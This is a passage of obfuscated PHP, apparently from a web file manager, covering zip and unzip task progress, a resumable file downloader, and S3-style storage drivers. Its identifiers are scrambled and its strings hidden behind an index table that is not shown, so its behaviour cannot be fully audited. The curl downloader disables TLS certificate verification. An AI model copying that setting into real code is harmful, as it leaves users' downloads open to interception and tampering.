$_SERVER[∞„˜ƒÑºª][1698]); goto F≥áèèâóƒ; AÙäú‡›¨ı: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Dóú—àø¶¿; FÉ†ËÃﬁÃ≈: if (!$døúÓ—⁄â—[$cÜ©à«Ö∞“[973]]) { $døúÓ—⁄â—[$cÜ©à«Ö∞“[973]] = LNG($cÜ©à«Ö∞“[1124]); } goto E¢¥ÃÀ°¶€; Dóú—àø¶¿: $cÜ©à«Ö∞“ =& $_SERVER[∞„˜ƒÑºª]; parent::startAfter(); Hook::bind($cÜ©à«Ö∞“[1120], array($this, $cÜ©à«Ö∞“[1121])); goto Bﬁ¶Ÿ Â«∏; Bﬁ¶Ÿ Â«∏: Hook::bind($cÜ©à«Ö∞“[765], array($this, $cÜ©à«Ö∞“[1122])); $døúÓ—⁄â— =& $this->task; $døúÓ—⁄â—[$cÜ©à«Ö∞“[1123]] = $cÜ©à«Ö∞“[770]; goto FÉ†ËÃﬁÃ≈; E¢¥ÃÀ°¶€: } protected function endAfter() { $e∂∫Ôë®é¯ =& $_SERVER[∞„˜ƒÑºª]; parent::endAfter(); Hook::unbind($e∂∫Ôë®é¯[1120], array($this, $e∂∫Ôë®é¯[1121])); Hook::unbind($e∂∫Ôë®é¯[765], array($this, $e∂∫Ôë®é¯[1122])); } public function updateAfter() { $dÕ≥√üÓâó =& $_SERVER[∞„˜ƒÑºª]; $DâÎÎ≤¡Ù∑ =& $this->task; if (!$DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1065]] || !$DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[454]]) { return; } if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1123]] == $dÕ≥√üÓâó[770]) { $A÷é†Éÿ√– = 0; if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1103]]) { $A÷é†Éÿ√– = $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1104]] / $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1103]]; } $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]] = $A÷é†Éÿ√– * 0.3; } else { if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1123]] == $dÕ≥√üÓâó[300]) { $A÷é†Éÿ√– = $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1066]] / $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1065]]; $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]] = 0.3 + $A÷é†Éÿ√– * 0.4; } else { if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1123]] == $dÕ≥√üÓâó[134]) { $e˜«≤ÿçﬂà = 0; if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1105]] == $dÕ≥√üÓâó[134]) { $e˜«≤ÿçﬂà = $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1104]]; } $A÷é†Éÿ√– = ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1108]] + $e˜«≤ÿçﬂà) / $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[454]]; $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]] = 0.3 + 0.4 + $A÷é†Éÿ√– * 0.3; } } } if ($DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]] > 0) { $dàÒ´à¨õÓ = timeFloat() - $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1069]] - $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1072]]; $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1073]] = $dàÒ´à¨õÓ * (1 - $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]]) / $DâÎÎ≤¡Ù∑[$dÕ≥√üÓâó[1067]]; } } public function addFile($dö¢Ü‚∏±ì) { goto f»´Öç–Ûç; FÔ‰ˆ»è´Ï: $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1065]] = 1; $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1109]] = array(); $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1109]][] = array($dèàï—Ëœ∑[387] => $e´ã—¬°Œ¢[$dèàï—Ëœ∑[28]], $dèàï—Ëœ∑[84] => $e´ã—¬°Œ¢[$dèàï—Ëœ∑[84]], $dèàï—Ëœ∑[755] => $e´ã—¬°Œ¢[$dèàï—Ëœ∑[755]] ? $e´ã—¬°Œ¢[$dèàï—Ëœ∑[755]] : $e´ã—¬°Œ¢[$dèàï—Ëœ∑[84]]); goto E∞Îö¿Æ‹å; EËÎÏ≥é‡Ö: $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1064]] = $dèàï—Ëœ∑[1113]; $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1105]] = $dèàï—Ëœ∑[770]; $d¿¬Àà¥°ï[$dèàï—Ëœ∑[454]] = $e´ã—¬°Œ¢[$dèàï—Ëœ∑[86]]; goto FÔ‰ˆ»è´Ï; f»´Öç–Ûç: $dèàï—Ëœ∑ =& $_SERVER[∞„˜ƒÑºª]; $d¿¬Àà¥°ï =& $this->task; $e´ã—¬°Œ¢ = IO::info($dö¢Ü‚∏±ì); goto b“ôÛÿ·ﬁõ; E∞Îö¿Æ‹å: $this->update(); goto c≤ ∫ÑÙ÷Â; b“ôÛÿ·ﬁõ: $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1101]] = $e´ã—¬°Œ¢[$dèàï—Ëœ∑[28]]; $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1103]] = $e´ã—¬°Œ¢[$dèàï—Ëœ∑[86]]; $d¿¬Àà¥°ï[$dèàï—Ëœ∑[1104]] = 0; goto EËÎÏ≥é‡Ö; c≤ ∫ÑÙ÷Â: } public function unzipAfter($e∑ØÉ∆ì“ç) { goto aéÌøß´ïµ; C’ÆﬁË¨ã¬: if ($bôÊÿÙé–ñ[$a±Íåç£ÉÍ[29]] == $a±Íåç£ÉÍ[163]) { $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1065]] = 1; } else { $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1065]] = $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[89]][$a±Íåç£ÉÍ[87]]; } $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1064]] = $a±Íåç£ÉÍ[33]; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1105]] = 0; goto dßµá¨‚á∏; D•Ç¢È¨Úï: $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1101]] = $a±Íåç£ÉÍ[33]; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1108]] = 0; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[454]] = $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[86]]; goto f»è‰Ú∞‡´; dßµá¨‚á∏: $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1066]] = 0; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1103]] = 0; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1104]] = 0; goto D•Ç¢È¨Úï; f»è‰Ú∞‡´: $this->update(); self::log($a±Íåç£ÉÍ[1125] . json_encode(array($d£û∏ÇóŒ∏, $bôÊÿÙé–ñ))); goto aÕ•ÀŒ∂·º; b¿ ª≠∑ûò: $bôÊÿÙé–ñ = IO::infoWithChildren($e∑ØÉ∆ì“ç); $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1109]] = array(); $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1109]][] = array($a±Íåç£ÉÍ[387] => $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[28]], $a±Íåç£ÉÍ[84] => $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[84]], $a±Íåç£ÉÍ[755] => $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[755]] ? $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[755]] : $bôÊÿÙé–ñ[$a±Íåç£ÉÍ[84]]); goto C’ÆﬁË¨ã¬; aéÌøß´ïµ: $a±Íåç£ÉÍ =& $_SERVER[∞„˜ƒÑºª]; $d£û∏ÇóŒ∏ =& $this->task; $d£û∏ÇóŒ∏[$a±Íåç£ÉÍ[1123]] = $a±Íåç£ÉÍ[134]; goto b¿ ª≠∑ûò; aÕ•ÀŒ∂·º: } public function nameParse($e◊ß≠∂êÑ—) { goto b”òôßî≤¯; A∞û ø»êæ: $this->update(); goto a∫æÁ£‰·‰; EÇ≈ ¬õ›÷: $F‘≥è†äıÁ = get_path_this($e◊ß≠∂êÑ—); if (strstr($F‘≥è†äıÁ, $fáâ˘çùÍÑ[98])) { $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1066]] += 1; $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1065]] += 1; } $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1101]] = $e◊ß≠∂êÑ—; goto A∞û ø»êæ; b”òôßî≤¯: $fáâ˘çùÍÑ =& $_SERVER[∞„˜ƒÑºª]; $e›«Ò§¬çÔ =& $this->task; if ($e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1123]] == $fáâ˘çùÍÑ[770]) { $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1123]] = $fáâ˘çùÍÑ[300]; $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[1108]] = 0; $e›«Ò§¬çÔ[$fáâ˘çùÍÑ[454]] = 0; } goto EÇ≈ ¬õ›÷; a∫æÁ£‰·‰: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fû’àù∑–ë =& $_SERVER[∞„˜ƒÑºª]; parent::startAfter(); Hook::bind($fû’àù∑–ë[1126], array($this, $fû’àù∑–ë[1121])); $b®ÜÊ≤»äâ =& $this->task; $b®ÜÊ≤»äâ[$fû’àù∑–ë[1123]] = $fû’àù∑–ë[770]; if (!$b®ÜÊ≤»äâ[$fû’àù∑–ë[973]]) { $b®ÜÊ≤»äâ[$fû’àù∑–ë[973]] = LNG($fû’àù∑–ë[1127]); } } protected function endAfter() { $eºâÚé◊·À =& $_SERVER[∞„˜ƒÑºª]; parent::endAfter(); Hook::unbind($eºâÚé◊·À[1126], array($this, $eºâÚé◊·À[1121])); } public function updateAfter() { $AÁÍ£ùÖè˘ =& $_SERVER[∞„˜ƒÑºª]; $fà‚€ä¨„ =& $this->task; if (!$fà‚€ä¨„[$AÁÍ£ùÖè˘[1065]] || !$fà‚€ä¨„[$AÁÍ£ùÖè˘[454]]) { return; } if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1123]] == $AÁÍ£ùÖè˘[770]) { $b¢Ù®èŒåü = $fà‚€ä¨„[$AÁÍ£ùÖè˘[1104]]; if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1105]] != $AÁÍ£ùÖè˘[770]) { $b¢Ù®èŒåü = 0; } $BÔ¬ €€±Õ = ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1108]] + $b¢Ù®èŒåü) / $fà‚€ä¨„[$AÁÍ£ùÖè˘[454]]; $fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]] = $BÔ¬ €€±Õ * 0.3; } else { if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1123]] == $AÁÍ£ùÖè˘[300]) { $BÔ¬ €€±Õ = $fà‚€ä¨„[$AÁÍ£ùÖè˘[1066]] / $fà‚€ä¨„[$AÁÍ£ùÖè˘[1065]]; $fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]] = 0.3 + $BÔ¬ €€±Õ * 0.5; } else { if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1123]] == $AÁÍ£ùÖè˘[134]) { $BÔ¬ €€±Õ = 0; if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1103]]) { $BÔ¬ €€±Õ = $fà‚€ä¨„[$AÁÍ£ùÖè˘[1104]] / $fà‚€ä¨„[$AÁÍ£ùÖè˘[1103]]; } $fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]] = 0.3 + 0.5 + $BÔ¬ €€±Õ * 0.2; } } } if ($fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]] > 0) { $C≤˘≈“ú©Ú = timeFloat() - $fà‚€ä¨„[$AÁÍ£ùÖè˘[1069]] - $fà‚€ä¨„[$AÁÍ£ùÖè˘[1072]]; $fà‚€ä¨„[$AÁÍ£ùÖè˘[1073]] = $C≤˘≈“ú©Ú * (1 - $fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]]) / $fà‚€ä¨„[$AÁÍ£ùÖè˘[1067]]; } } public function copyFileStart($F¨Ÿ¨°ªÎà, $EÜﬂ¡ùπÑ, $BŒ‹¡‰‡Ü‹, $Eà∑Ëô¿øÂ, $aÇ£Üä«Ê, $B¿î§œÓ˘Ç) { $Båø∏èñ»ö =& $_SERVER[∞„˜ƒÑºª]; parent::copyFileStart($F¨Ÿ¨°ªÎà, $EÜﬂ¡ùπÑ, $BŒ‹¡‰‡Ü‹, $Eà∑Ëô¿øÂ, $aÇ£Üä«Ê, $B¿î§œÓ˘Ç); $C¿ÎçõΩ∫ü =& $this->task; if ($C¿ÎçõΩ∫ü[$Båø∏èñ»ö[1123]] == $Båø∏èñ»ö[300]) { $C¿ÎçõΩ∫ü[$Båø∏èñ»ö[1123]] = $Båø∏èñ»ö[134]; } $this->update(); } public function copyFileEnd($EÉààæ˘Úú, $EÁıΩ·•≠Ñ, $Bíﬁı‡Úà÷, $aò·©ƒçô¬, $F≥¥„áèµ≥, $Aéê“†∂ÇÏ) { $cç«ê‘Çö¢ =& $_SERVER[∞„˜ƒÑºª]; $EÙ–◊√∞≤ÿ =& $this->task; $EÙ–◊√∞≤ÿ[$cç«ê‘Çö¢[1104]] = $EÙ–◊√∞≤ÿ[$cç«ê‘Çö¢[1103]]; $EÙ–◊√∞≤ÿ[$cç«ê‘Çö¢[1108]] += $EÙ–◊√∞≤ÿ[$cç«ê‘Çö¢[1103]]; $EÙ–◊√∞≤ÿ[$cç«ê‘Çö¢[1105]] = $cç«ê‘Çö¢[33]; $this->update(); } public function nameParse($bﬂÍñ£íÎú) { $E≈òÊ°©œ™ =& $_SERVER[∞„˜ƒÑºª]; $AÆäô‰Ì«Ó =& $this->task; if ($AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1066]] < $AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1065]]) { $dô˜ÍóêÓ¬ = get_path_this($bﬂÍñ£íÎú); if (strstr($dô˜ÍóêÓ¬, $E≈òÊ°©œ™[98])) { $AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1066]] += 1; } } if ($AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1123]] == $E≈òÊ°©œ™[770]) { $AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1123]] = $E≈òÊ°©œ™[300]; } $AÆäô‰Ì«Ó[$E≈òÊ°©œ™[1101]] = $bﬂÍñ£íÎú; $this->update(); } } class Downloader { static function start($BñÀ±˘åë“, $A˜ô„Ï√ã…, $e™≤îßçü± = 10) { goto dÎ“∞Î≤ﬁõ; CÓ◊Ÿ¯ûÕŒ: if ($Eï ÿﬁ ê˜[$BóƒâõπïÜ[762]]) { @unlink($DÕœûÎ™¨Ì); } return $Eï ÿﬁ ê˜; goto C∆Æ∆°–ﬁ√; aûËú®∏‹ï: if (!$BñÀ±˘åë“) { return array($BóƒâõπïÜ[762] => !1, $BóƒâõπïÜ[764] => $BóƒâõπïÜ[767]); } if (!$eÿ„éÊÔ¯É[$BóƒâõπïÜ[1130]] || $eÿ„éÊÔ¯É[$BóƒâõπïÜ[324]] == 0) { @unlink($eíöÚ¶∑äÊ); @unlink($A˜ô„Ï√ã…); $Eï ÿﬁ ê˜ = self::fileDownloadFopen($BñÀ±˘åë“, $A˜ô„Ï√ã…, $eÿ„éÊÔ¯É[$BóƒâõπïÜ[324]]); if ($Eï ÿﬁ ê˜[$BóƒâõπïÜ[762]]) { return $Eï ÿﬁ ê˜; } else { @unlink($eíöÚ¶∑äÊ); @unlink($A˜ô„Ï√ã…); $Eï ÿﬁ ê˜ = self::fileDownloadCurl($BñÀ±˘åë“, $A˜ô„Ï√ã…, !1, 0, $eÿ„éÊÔ¯É[$BóƒâõπïÜ[324]]); @unlink($eíöÚ¶∑äÊ); return $Eï ÿﬁ ê˜; } } $Cø†ÍåΩ«ı = is_file($eíöÚ¶∑äÊ) ? filesize($eíöÚ¶∑äÊ) : 0; goto A•ñÎ∫–â¬; dÎ“∞Î≤ﬁõ: $BóƒâõπïÜ =& $_SERVER[∞„˜ƒÑºª]; if (!request_url_safe($BñÀ±˘åë“)) { return array($BóƒâõπïÜ[762] => !1, $BóƒâõπïÜ[764] => $BóƒâõπïÜ[767]); } $DÕœûÎ™¨Ì = $A˜ô„Ï√ã… . $BóƒâõπïÜ[1128]; goto CŸÙ˜∆õΩƒ; CŸÙ˜∆õΩƒ: $eíöÚ¶∑äÊ = $A˜ô„Ï√ã… . $BóƒâõπïÜ[1129]; if (is_array($BñÀ±˘åë“)) { $eÿ„éÊÔ¯É = $BñÀ±˘åë“; } else { $eÿ„éÊÔ¯É = url_header($BñÀ±˘åë“); } $BñÀ±˘åë“ = $eÿ„éÊÔ¯É[$BóƒâõπïÜ[294]]; goto aûËú®∏‹ï; BƒˆÒÚÊ‘ü: if (is_file($DÕœûÎ™¨Ì)) { $fÃûâôÀÿÇ = file_get_contents($DÕœûÎ™¨Ì); $e∫ÈÔØÿë◊ = json_decode($fÃûâôÀÿÇ, 1); } if (file_exists($A˜ô„Ï√ã…) && $FË¯≠’¢ãÙ == filesize($A˜ô„Ï√ã…)) { @unlink($eíöÚ¶∑äÊ); @unlink($DÕœûÎ™¨Ì); return array($BóƒâõπïÜ[762] => !0, $BóƒâõπïÜ[764] => $BóƒâõπïÜ[1132]); } if ($e∫ÈÔØÿë◊[$BóƒâõπïÜ[324]] != $FË¯≠’¢ãÙ) { $e∫ÈÔØÿë◊ = array($BóƒâõπïÜ[324] => $FË¯≠’¢ãÙ); } goto f»õÀªÚàÇ; f»õÀªÚàÇ: if ($Cø†ÍåΩ«ı > $FË¯≠’¢ãÙ) { @unlink($eíöÚ¶∑äÊ); } file_put_contents($DÕœûÎ™¨Ì, json_encode($e∫ÈÔØÿë◊)); $Eï ÿﬁ ê˜ = self::fileDownloadCurl($BñÀ±˘åë“, $A˜ô„Ï√ã…, !0, $Cø†ÍåΩ«ı, $FË¯≠’¢ãÙ); goto CÓ◊Ÿ¯ûÕŒ; A•ñÎ∫–â¬: $FË¯≠’¢ãÙ = intval($eÿ„éÊÔ¯É[$BóƒâõπïÜ[324]]); if (file_exists($eíöÚ¶∑äÊ) && time() - filemtime($eíöÚ¶∑äÊ) < 3) { return array($BóƒâõπïÜ[762] => !1, $BóƒâõπïÜ[764] => $BóƒâõπïÜ[1131]); } $e∫ÈÔØÿë◊ = array(); goto BƒˆÒÚÊ‘ü; C∆Æ∆°–ﬁ√: } static function fileDownloadFopen($fâüßºøçŒ, $E†¢Ñµ∑©ß, $dı‰úÓﬂ†√ = 0) { $C›≥¡ÍÍ‰± =& $_SERVER[∞„˜ƒÑºª]; @ini_set($C›≥¡ÍÍ‰±[1133], $C›≥¡ÍÍ‰±[1134]); $aÖí≥»ˆÏñ = $E†¢Ñµ∑©ß . $C›≥¡ÍÍ‰±[1129]; set_timeout(); @unlink($aÖí≥»ˆÏñ); if ($Fﬂ∆»®Ñ‚Œ = @fopen($fâüßºøçŒ, $C›≥¡ÍÍ‰±[1135])) { goto F∂›√ÿ›¨Ì; c≈ÓÖ’îåõ: fclose($Fﬂ∆»®Ñ‚Œ); $fî≤öÓ˘é∆ = filesize(iconv_system($aÖí≥»ˆÏñ)); if ($dı‰úÓﬂ†√ != 0 && $fî≤öÓ˘é∆ != $dı‰úÓﬂ†√) { return array($C›≥¡ÍÍ‰±[762] => !1, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[1139]); } goto Aﬁ‡ËÊ¶úÙ; Aﬁ‡ËÊ¶úÙ: self::checkGzip($aÖí≥»ˆÏñ); if (!@rename($aÖí≥»ˆÏñ, $E†¢Ñµ∑©ß)) { usleep(round(rand(0, 1000) * 50)); @unlink($E†¢Ñµ∑©ß); $Fï¨«∞Ú∫Â = @rename($aÖí≥»ˆÏñ, $E†¢Ñµ∑©ß); if (!$Fï¨«∞Ú∫Â) { return array($C›≥¡ÍÍ‰±[762] => !1, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[1140]); } } return array($C›≥¡ÍÍ‰±[762] => !0, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[452]); goto d«Ã∏ÔÒ“ç; F∂›√ÿ›¨Ì: if (!($B÷¥¿êå¯Ã = @fopen($aÖí≥»ˆÏñ, $C›≥¡ÍÍ‰±[1136]))) { return array($C›≥¡ÍÍ‰±[762] => !1, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[1137]); } while (!feof($Fﬂ∆»®Ñ‚Œ)) { if (!file_exists($aÖí≥»ˆÏñ)) { fclose($B÷¥¿êå¯Ã); return array($C›≥¡ÍÍ‰±[762] => !1, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[1138]); } clearstatcache(); if ($dı‰úÓﬂ†√ > 0 && $dı‰úÓﬂ†√ == filesize(iconv_system($aÖí≥»ˆÏñ))) { break; } fwrite($B÷¥¿êå¯Ã, fread($Fﬂ∆»®Ñ‚Œ, 1024 * 8), 1024 * 8); } fclose($B÷¥¿êå¯Ã); goto c≈ÓÖ’îåõ; d«Ã∏ÔÒ“ç: } else { return array($C›≥¡ÍÍ‰±[762] => !1, $C›≥¡ÍÍ‰±[764] => $C›≥¡ÍÍ‰±[1141]); } } static function fileDownloadCurl($AîÀ‰µ‡ˆÇ, $E“ñÊÏû‡¯, $A⁄ÛÀ“ßµ‚ = false, $F±æ∏çÙØ— = 0, $a˘‰ÍòË = 0) { goto bÉüãßÇ≠ò; BØ›Úä∆éá: if ($A⁄ÛÀ“ßµ‚) { curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_RANGE, $F±æ∏çÙØ— . $d¿ôÜò√ÈØ[469]); } curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_FILE, $a»ª∫êßª∞); curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_REFERER, get_url_link($AîÀ‰µ‡ˆÇ)); goto bŸãÍê’¨ß; CÉª∫Ÿë—ñ: return array($d¿ôÜò√ÈØ[762] => !1, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[1144]); goto eå«Æå‘Ó‚; bÉüãßÇ≠ò: $d¿ôÜò√ÈØ =& $_SERVER[∞„˜ƒÑºª]; $A£´á¬æ√‚ = $E“ñÊÏû‡¯ . $d¿ôÜò√ÈØ[1129]; set_timeout(); goto F«°ÈÁ§ÇÒ; dŒäíÒ¥ê›: curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_USERAGENT, $d¿ôÜò√ÈØ[1134]); $A„‡Ú√Ù»‰ = curl_exec($Eë–≈ÀÑèÙ); curl_progress_end($Eë–≈ÀÑèÙ); goto FÀıÆÊ˜ºë; b≠åºÜ›‚ü: curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_NOPROGRESS, !1); curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_PROGRESSFUNCTION, $d¿ôÜò√ÈØ[939]); curl_progress_start($Eë–≈ÀÑèÙ); goto dŒäíÒ¥ê›; B¶˜ïÕ†§ß: if ($EÎ≠éâã”„ < $a˘‰ÍòË && $a˘‰ÍòË != 0) { return array($d¿ôÜò√ÈØ[762] => !1, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[1131]); } if ($EÎ≠éâã”„ > $a˘‰ÍòË && $a˘‰ÍòË != 0) { return array($d¿ôÜò√ÈØ[762] => !1, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[1139]); } if ($A„‡Ú√Ù»‰ && filesize($A£´á¬æ√‚) != 0) { self::checkGzip($A£´á¬æ√‚); if (!@rename($A£´á¬æ√‚, $E“ñÊÏû‡¯)) { @unlink($E“ñÊÏû‡¯); $A„‡Ú√Ù»‰ = @rename($A£´á¬æ√‚, $E“ñÊÏû‡¯); if (!$A„‡Ú√Ù»‰) { return array($d¿ôÜò√ÈØ[762] => !1, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[1143]); } } return array($d¿ôÜò√ÈØ[762] => !0, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[452]); } goto CÉª∫Ÿë—ñ; FÀıÆÊ˜ºë: curl_close($Eë–≈ÀÑèÙ); fclose($a»ª∫êßª∞); $EÎ≠éâã”„ = filesize(iconv_system($A£´á¬æ√‚)); goto B¶˜ïÕ†§ß; bŸãÍê’¨ß: curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Eë–≈ÀÑèÙ, CURLOPT_SSL_VERIFYHOST, 0); goto b≠åºÜ›‚ü; F«°ÈÁ§ÇÒ: $a»ª∫êßª∞ = @fopen($A£´á¬æ√‚, $d¿ôÜò√ÈØ[476]); if (!$a»ª∫êßª∞) { return array($d¿ôÜò√ÈØ[762] => !1, $d¿ôÜò√ÈØ[764] => $d¿ôÜò√ÈØ[1142]); } $Eë–≈ÀÑèÙ = curl_init($AîÀ‰µ‡ˆÇ); goto BØ›Úä∆éá; eå«Æå‘Ó‚: } static function checkGzip($b∫à·êË§‚) { goto bçÎú√Îñª; bçÎú√Îñª: $cëáÔÒÏá√ = $_SERVER[∞„˜ƒÑºª][1145]; $Cë¡ä†ú¶Ÿ = file_sub_str($b∫à·êË§‚, 0, 2); if ($cëáÔÒÏá√ != $Cë¡ä†ú¶Ÿ) { return; } goto fäÛç≠´∑˜; FÈàµç∞ãò: file_put_contents($b∫à·êË§‚, $dõ“›–•˘ˆ); goto B∂Üñ™¶Üÿ; fäÛç≠´∑˜: ob_start(); readgzfile($b∫à·êË§‚); $dõ“›–•˘ˆ = ob_get_clean(); goto FÈàµç∞ãò; B∂Üñ™¶Üÿ: } } goto A»É€ÃÖ¿ß; Fÿ±£Œøøµ: class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($f¶¶Îä∑Òè) { parent::__construct($f¶¶Îä∑Òè); $this->signatureVersion($_SERVER[∞„˜ƒÑºª][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($Cﬁÿ¬À¢ÀÖ, $e·≠êÃﬁ√®, $Bú¬ñ°≠©Ø = array()) { $a††ùñäâô = $this->tempFile($Cﬁÿ¬À¢ÀÖ); $this->download($Cﬁÿ¬À¢ÀÖ, $a††ùñäâô); $DñÀ∂çÿß‚ = $this->upload($e·≠êÃﬁ√®, $a††ùñäâô); $this->tempFileRemve($a††ùñäâô); return $DñÀ∂çÿß‚; } public function uploadFormData($Aíáçı≥„¡, $CÉÊ¨Öﬂãæ = 3600) { return parent::uploadFormData($Aíáçı≥„¡, $CÉÊ¨Öﬂãæ); } public function fileOut($b∑üúÉÀ∫˘, $d∆‚¬ﬁ¥êì = false, $fäËˆ ≤ÆÍ = false, $D‚èΩÃÁ±Ú = '') { parent::fileOutServer($b∑üúÉÀ∫˘, $d∆‚¬ﬁ¥êì, $fäËˆ ≤ÆÍ, $D‚èΩÃÁ±Ú); } public function fileOutLink($A„†˘¢ÕØ‘) { header($_SERVER[∞„˜ƒÑºª][154] . $A„†˘¢ÕØ‘); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($EñåÈ¶πﬂ’) { parent::__construct($EñåÈ¶πﬂ’); $this->signatureVersion($_SERVER[∞„˜ƒÑºª][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function isFolder($AùÒó˘Ï∏Ö) { $f§ù—⁄®í÷ =& $_SERVER[∞„˜ƒÑºª]; $AùÒó˘Ï∏Ö = trim($AùÒó˘Ï∏Ö, $f§ù—⁄®í÷[8]); if (!empty($AùÒó˘Ï∏Ö)) { $AùÒó˘Ï∏Ö .= $f§ù—⁄®í÷[8]; } if ($this->getObjectInfo($AùÒó˘Ï∏Ö)) { return !0; } return parent::isFolder($AùÒó˘Ï∏Ö); } public function fileOutLink($FáØÙÁøöæ) { header($_SERVER[∞„˜ƒÑºª][154] . $FáØÙÁøöæ); die; } } class PathDriverNOS extends PathDriverBaseS3 { public function __construct($EıâÑ∫∑¯‹) { parent::__construct($EıâÑ∫∑¯‹); $this->client->setSignatureVersion($_SERVER[∞„˜ƒÑºª][196]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function isFolder($BãŸ“áë√°) { goto eå∂ã∞ë√∂; CÙﬁâÉ≤∏Ú: $aΩÀˆôΩ÷É = $this->getObjectInfo($BãŸ“áë√°); if ($aΩÀˆôΩ÷É) { return !0; } $A˜«»“Ì∏ì = $this->listObjs($BãŸ“áë√°, null, 3, $fçÕò”Çîß[8]); goto C“¡êè–ë®; C“¡êè–ë®: return count($A˜«»“Ì∏ì) == 1 ? !1 : !0; goto f◊Ö÷úÀıÛ; eå∂ã∞ë√∂: $fçÕò”Çîß =& $_SERVER[∞„˜ƒÑºª]; $BãŸ“áë√° = trim($BãŸ“áë√°, $fçÕò”Çîß[8]); if (!empty($BãŸ“áë√°)) { $BãŸ“áë√° .= $fçÕò”Çîß[8]; } goto CÙﬁâÉ≤∏Ú; f◊Ö÷úÀıÛ: } 